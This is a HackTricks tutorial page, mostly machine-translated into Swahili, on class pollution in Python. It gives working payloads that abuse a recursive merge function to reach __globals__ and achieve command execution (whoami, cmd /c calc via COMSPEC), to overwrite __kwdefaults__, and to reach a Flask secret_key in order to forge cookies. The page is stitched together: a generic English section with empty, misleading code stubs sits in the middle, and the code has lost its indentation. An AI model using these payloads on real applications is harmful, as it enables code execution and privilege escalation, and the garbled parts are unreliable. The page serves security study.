# Uchafuzi wa Darasa (Uchafuzi wa Prototipi wa Python)

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Mfano Msingi

Angalia jinsi inavyowezekana kuchafua darasa la vitu na herufi:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Mfano wa Msingi wa Udhaifu

### Introduction

In this section, we will discuss a basic vulnerability known as **class pollution**. Class pollution is a type of vulnerability that occurs when an attacker is able to modify or manipulate the properties and methods of a class in a programming language.

### Understanding Class Pollution

Class pollution takes advantage of the dynamic nature of certain programming languages, such as Python. In Python, classes are mutable, which means that their properties and methods can be modified at runtime.

An attacker can exploit this vulnerability by injecting malicious code into a class, thereby altering its behavior. This can lead to various security issues, such as unauthorized access, privilege escalation, or even remote code execution.

### Example Scenario

To better understand class pollution, let's consider a simple example. Suppose we have a Python class called `User` with a method called `login`. The `login` method is responsible for authenticating a user.

```python
class User:
    def login(self, username, password):
        # Authenticates the user
        # ...
```

Now, imagine an attacker is able to pollute the `User` class by injecting a malicious method called `login` that performs a different action, such as logging the user's credentials.

```python
class User:
    def login(self, username, password):
        # Logs the user's credentials
        # ...
```

If the application relies on the `User` class for authentication, the attacker's injected code will be executed instead of the legitimate `login` method. This can result in the attacker gaining unauthorized access to the system.

### Mitigation

To mitigate class pollution vulnerabilities, it is important to follow secure coding practices. Here are some recommendations:

- Avoid using mutable classes whenever possible.
- Implement proper input validation and sanitization to prevent code injection.
- Regularly update and patch the programming language and frameworks used in your application.
- Use static code analysis tools to identify potential vulnerabilities in your codebase.

By following these best practices, you can reduce the risk of class pollution vulnerabilities and enhance the security of your applications.

### Conclusion

Class pollution is a basic vulnerability that can have serious consequences if not properly addressed. It is crucial for developers to be aware of this vulnerability and take appropriate measures to mitigate it.
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Mifano ya Vifaa

<details>

<summary>Kuunda thamani ya msingi ya mali ya darasa kwa RCE (subprocess)</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Kuchafua darasa na vars za ulimwengu kupitia <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Utekelezaji wa mchakato usio na kikomo</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Kuandika upya <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** ni sifa maalum ya kazi zote, kulingana na [hati ya Python](https://docs.python.org/3/library/inspect.html), ni "ramani ya thamani za chaguo-msingi kwa **vigezo vya pekee vya maneno**". Kuchafua sifa hii inaturuhusu kudhibiti thamani za chaguo-msingi za vigezo vya pekee vya maneno vya kazi, hivi ni vigezo vya kazi vinavyokuja baada ya \* au \*args.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Kuandika upya siri ya Flask kwenye faili tofauti</summary>

Kwa hiyo, ikiwa unaweza kufanya uchafuzi wa darasa juu ya kitu kilichoelezwa katika faili kuu ya python ya wavuti lakini **ambayo darasa lake limefafanuliwa katika faili tofauti** kuliko ile kuu. Kwa sababu ili kupata ufikiaji wa \_\_globals\_\_ katika mizigo iliyotangulia unahitaji kupata ufikiaji wa darasa la kitu au njia za darasa, utaweza **kupata ufikiaji wa globals katika faili hiyo, lakini sio katika ile kuu**. \
Kwa hiyo, **hutaweza kupata ufikiaji wa kipengele cha kawaida cha programu ya Flask** ambacho kimefafanua **ufunguo wa siri** katika ukurasa wa kuu:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Katika hali hii unahitaji kifaa cha kupitia faili ili kufikia faili kuu ili **kupata ufikiaji wa kifaa cha kawaida `app.secret_key`** ili kubadilisha Flask secret key na kuweza [**kuongeza mamlaka** kwa kujua ufunguo huu](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload kama hii [kutoka kwenye andiko hili](https://ctftime.org/writeup/36082):

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

Tumia mzigo huu wa **kubadilisha `app.secret_key`** (jina katika programu yako inaweza kuwa tofauti) ili uweze kusaini kuki za flask zenye mamlaka zaidi.

</details>

Angalia pia ukurasa ufuatao kwa vifaa vya kusoma tu:

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## Marejeo

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
